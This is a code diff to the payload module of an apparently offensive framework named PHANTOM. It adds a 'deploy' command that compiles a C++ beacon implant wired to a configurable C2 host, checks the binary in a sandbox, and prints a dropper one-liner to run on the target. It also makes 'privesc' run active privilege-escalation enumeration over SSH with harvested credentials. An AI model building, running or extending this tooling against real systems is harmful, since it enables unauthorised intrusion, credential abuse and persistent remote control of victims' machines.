@@ -98,13 +98,41 @@ class PayloadModule(BaseModule):
     module_name = "payload"
 
     def build_commands(self) -> dict:
-        return {
-            "CORE": ["generate", "privesc"],
-            "LISTENER": ["handler <port> <payload>"]
-        }
+        return self._with_suggestions(
+            {
+                "CORE": ["generate", "deploy", "privesc"],
+                "LISTENER": ["handler <port> <payload>"],
+            },
+            self.suggest_commands(),
+        )
+
+    def suggest_commands(self) -> dict:
+        """Platform-aware payload generation for the detected target OS."""
+        from phantom.modules.suggest import payload_suggestion_group
+        return payload_suggestion_group()
 
     def do_privesc(self, _):
-        """privesc — List suggested Privilege Escalation tools and techniques for the target."""
+        """privesc — run ACTIVE privilege-escalation enumeration on the
+        target (sudo -l, SUID, writable files) using harvested creds, and
+        list the matching GTFOBins/tools. Falls back to the tool list when
+        no access is available yet."""
+        # If we have access (creds on the target), delegate to the real
+        # enumeration so this is actionable, not just a static list.
+        try:
+            from phantom.core.knowledge import session_wm
+            if session_wm().find("creds", valid=True):
+                from phantom.modules.exploit import ExploitModule
+                notifier.status("Access available — running active privesc "
+                                "enumeration over SSH...")
+                ExploitModule().do_privesc_run("")
+                console.print(
+                    "\n[dim]Suggested tools for the findings above:[/]")
+                console.print("  - [green]LinPEAS[/] / [green]linux-exploit-suggester[/]")
+                console.print("  - [green]GTFOBins[/]: https://gtfobins.github.io")
+                return
+        except Exception:
+            pass
+        # No access yet: senior guidance + the enumeration plan to reach it.
         os_string, arch, platform = self._guess_os()
         
         console.print(f"\n[bold yellow]--- Privilege Escalation Assistant ({platform.capitalize()} {arch}) ---[/]")
@@ -135,13 +163,29 @@ class PayloadModule(BaseModule):
 
     def _guess_os(self) -> tuple:
         """
-        Try to detect target OS from scan results.
+        Try to detect target OS: shared WorldModel `os` finding first (the
+        senior source — scan wrote it there), then scan results.
         Returns (os_string, arch, platform).
         If detection fails, returns ("Unknown (defaulting to Linux x64)", "x64", "linux").
         """
         target = session.target
         if not target:
             return "Unknown (defaulting to Linux x64)", "x64", "linux"
+
+        # 0. Shared WorldModel os finding (written by scan / reasoning)
+        try:
+            from phantom.core.knowledge import session_wm
+            os_f = session_wm().find("os")
+            if os_f and isinstance(os_f[0].value, dict):
+                name = str(os_f[0].value.get("os") or os_f[0].value.get("name") or "")
+                if name:
+                    low = name.lower()
+                    if "windows" in low:
+                        return f"{name} (from shared knowledge)", "x64", "windows"
+                    if "linux" in low or "ubuntu" in low or "debian" in low or "centos" in low:
+                        return f"{name} (from shared knowledge)", "x64", "linux"
+        except Exception:
+            pass
 
         # 1. Try XML-based OS detection (most accurate)
         os_string = _detect_os_from_xml(target)
@@ -176,6 +220,59 @@ class PayloadModule(BaseModule):
     def _suggest_format(self, platform: str) -> str:
         """Return suggested format key based on platform."""
         return "6" if platform == "windows" else "1"  # exe or elf
+
+    def do_deploy(self, _):
+        """deploy — build and preflight PHANTOM's OWN C++ beacon dropper for
+        the detected target platform (the same binary the auto-mode ships),
+        then print the one-liner to execute on the target."""
+        os_string, arch, platform = self._guess_os()
+        c2_host = os.getenv("PHANTOM_C2_HOST", "127.0.0.1")
+        c2_port = int(os.getenv("PHANTOM_C2_PORT", "8080"))
+        notifier.info(f"Target platform: {platform} ({arch}) — {os_string}")
+        notifier.info(f"C2 callback: {c2_host}:{c2_port}")
+        try:
+            from phantom.utils.builder import generate_dropper, compile_beacon
+            from phantom.utils.c2_crypto import write_beacon_c2_config
+            import phantom
+            beacon_dir = os.path.join(os.path.dirname(phantom.__file__),
+                                      "payloads", "beacon")
+            cfg_path = os.path.join(beacon_dir, "src", "c2_config.h")
+            current = ""
+            if os.path.exists(cfg_path):
+                with open(cfg_path, "r", encoding="utf-8") as f:
+                    current = f.read()
+            desired = write_beacon_c2_config(
+                beacon_dir, host=c2_host, port=c2_port, use_ssl=True)
+            binary = compile_beacon(
+                platform, os.path.dirname(phantom.__file__),
+                force_rebuild=(desired != current), arch=arch,
+                host=c2_host, port=c2_port, use_ssl=True)
+            if not binary:
+                notifier.error("Beacon build failed (cross-toolchain missing?)")
+                return
+        except Exception as e:
+            notifier.error(f"Beacon build failed: {e}")
+            return
+        # sandbox preflight of the compiled binary (best-effort: backends
+        # missing just means 'no verdict', never a crash)
+        try:
+            from phantom.automation.sandbox.sandbox import SandboxEngine
+            verdict = SandboxEngine().preflight(binary)
+            if verdict.approved:
+                notifier.success("Sandbox preflight: APPROVED.")
+            else:
+                notifier.warn(f"Sandbox preflight: {verdict.summary()}")
+        except Exception:
+            notifier.warn("Sandbox preflight unavailable (no backend) — skipping.")
+        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True)
+        if not dropper:
+            notifier.error("No dropper defined for this platform.")
+            return
+        console.print(f"\n[bold green][+] Deploy command (run on target):[/]")
+        console.print(f"    [yellow]{dropper}[/]\n")
+        session.add_note(f"Payload: {platform} beacon built for {c2_host}:{c2_port}")
+        notifier.info("The beacon checks in to your C2 — 'phantom --c2' -> "
+                      "'beacons' to interact.")
 
     def do_generate(self, _):
         """Interactive payload generation wizard with auto OS/arch detection."""
@@ -324,5 +421,5 @@ class PayloadModule(BaseModule):
     def do_run(self, _):
         self.do_generate(_)
 
-    def do_preview(self, _):
+    def _execute_flow(self, _):
         self.do_generate(_)
